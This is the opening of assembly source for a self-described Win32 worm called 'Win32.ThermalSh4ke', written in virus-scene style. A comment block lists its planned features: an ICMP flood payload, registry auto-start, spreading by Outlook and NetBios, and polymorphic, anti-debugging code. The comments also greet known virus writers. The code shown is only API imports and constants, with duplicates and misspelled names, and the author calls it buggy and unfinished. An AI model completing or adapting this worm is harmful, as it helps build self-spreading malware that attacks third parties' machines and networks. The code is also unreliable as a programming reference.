;; Win32.ThermalSh4ke
;;
;; Comment:
;;    Heyyyyy guyyzz! Time to introduce Win32.ThermalSh4ke:
;;    A self-*spreading* parAsitic feather-weight internet-worm. It
;;    is one of my first ever polymorphic generic malware for the Win32.
;;    As it is a perfect opporunity to show my BlaCk-H@ skillzz. xD.
;;    HoweveR, Im still a n0ob in asm sO the C0de mighT be buggY. However,
;;    The worm body is still unfinished, so don't expect much!
;;
;; General sheet of characteristics:
;;    Name of the virus.............: Win32.ThermalSh4ke
;;    Author........................: Timo 'HaZeL' Sarkar / March 2021
;;    Size..........................: On 1st generation: approx. 60 bytes
;;    Compiled size.................: On 1st generation: approx.
;;    Payloads......................: Yes: DOS ICMP Flood on 31st of month
;;    Targets.......................: Win32 (Windoze 2k/7/8/10)
;;    Auto-startup..................: Registers dropped binaries in Sysreg
;;    Spread-techniques.............: Outlook/Mail and NetBios backdoor
;;    Encrypted.....................: Yes
;;    Anti-debugging................: Yes
;;    Polymorphic...................: Yes
;;    Metamorphic...................: Yes
;;    OS-Residence..................: Ring 0 and Ring 3
;; 
;; Greetingzzz:
;;    Greetingz go to Z0mbie (Creator of Zmist), The Mental Driller 
;;    (Creator of Metaph0r), x2-dev: for the good advisory and greetz 
;;    to the 29/A group!

.386
.MODEL  FLAT
.DATA

JUMPS

;; Definition utilities for the little-endian calculation
DBWI        MACRO   LIL_ENDIAN
            DW      (LIL_ENDIAN SHR 8) + ((LIL_ENDIAN AND 00FFh) SHL 8)
ENDM

EXTRN       WSAGetLastError:PROC
EXTRN       ioctlsocket:PROC 
EXTRN       ExitProcess:PROC 
EXTRN       WSAStartup:PROC 
EXTRN       WritePrivateProfileStringA:PROC
EXTRN       WSACleanup:PROC
EXTRN       socket:PROC
EXTRN       closesocket:PROC
EXTRN       setsocketopt:PROC
EXTRN       InternetGetConnectedState:PROC
EXTRN       DeleteFileA:PROC
EXTRN       connect:PROC
EXTRN       setsockopt:PROC
EXTRN       PeekMessageA:PROC
EXTRN       SetFileAttributesA:PROC
EXTRN       GetSystemDirectoryA:PROC
EXTRN       CreateFileA:PROC
EXTRN       recv:PROC
EXTRN       send:PROC
EXTRN       sendto:PROC
EXTRN       CloseHandle:PROC
EXTRN       GetSystemTime:PROC
EXTRN       GetModuleHandle
EXTRN       RegOpenKeyExA:PROC
EXTRN       RegSetValueExA:PROC
EXTRN       RegCloseKey:PROC
EXTRN       ReadFile:PROC
EXTRN       CopyFileA:PROC
EXTRN       WNetAddConnection2A:PROC
EXTRN       WNetCancelConnection2A:PROC
EXTRN       SetErrorMode:PROC
EXTRN       GetModuleFileNameA:PROC
EXTRN       FindWindowA:PROC
EXTRN       PostMessageA:PROC
EXTRN       GetTickCount:PROC
EXTRN       WriteFile:PROC
EXTRN       GetLocalTime:PROC
EXTRN       WinExec:PROC
EXTRN       select:PROC
EXTRN       GetPrivateProfileStringA:PROC
EXTRN       GetModuleHandleA:PROC
EXTRN       GetProcAddress:PROC
EXTRN       WNetAddConnection2A:PROC
EXTRN       WNetEnumResourceA:PROC
EXTRN       WNetOpenEnumA:PROC
EXTRN       WNetCloseEnum:PROC
EXTRN       RegQueryValueExA:PROC
EXTRN       gethostbyname:PROC
EXTRN       inet_ntoa:PROC

;; Some constant definitions, that get important later
WORM_SIZE                   EQU     6144
SEM_NOGPFAUL_TERRORBOX      EQU     00000002h
OPEN_EXISTING               EQU     00000003h
CREATE_ALWAYS               EQU     00000002h
SO_SNDTIMEO                 EQU     1005h
SO_RCVTIMEO                 EQU     1006h
RESSOURCE_GLOBALNET         EQU     00000002h
RESSOURCEUSAGE_CONNECTABLE  EQU     00000001h
RESSOURCEUSAGE_CONTAINER    EQU     00000002h
RESSOURCEUSAGE_CONNECTABLE  EQU     00000001h
RESSOURCETYPE_DISK          EQU     00000001h
SOL_SOCKET                  EQU     0FFFFh
HKEY_CURRENT_USER           EQU     80000001h
KEY_QUERY_VALUE             EQU     1
KEY_WRITE                   EQU     00020006h
REG_SZ                      EQU     00000001h
GENERIC_READ                EQU     80000000h
GENERIC_WRITE               EQU     40000000h
FILE_SHARE_READ             EQU     00000001h
FILE_ATTRIBUTE_HIDDEN       EQU     2
AF_INET                     EQU     2
IPPROTO_IGMP                EQU     2
SOCK_STREAM                 EQU     1
SOCK_RAW                    EQU     3
FIONBIO                     EQU     8004667Eh
WM_QUIT                     EQU     0012h
